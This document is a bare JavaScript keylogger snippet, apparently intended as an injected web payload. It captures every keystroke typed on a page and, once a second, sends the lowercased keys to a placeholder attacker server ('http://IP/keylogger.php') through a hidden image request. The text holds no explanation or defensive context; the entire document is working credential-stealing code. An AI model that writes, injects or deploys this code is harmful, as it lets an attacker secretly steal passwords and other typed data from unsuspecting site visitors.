var keys='';

document.onkeydown = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
if (keys.length >0) {
new Image().src = 'http://IP/keylogger.php?c='+ keys.toLowerCase();
keys='';
}
}, 1000);
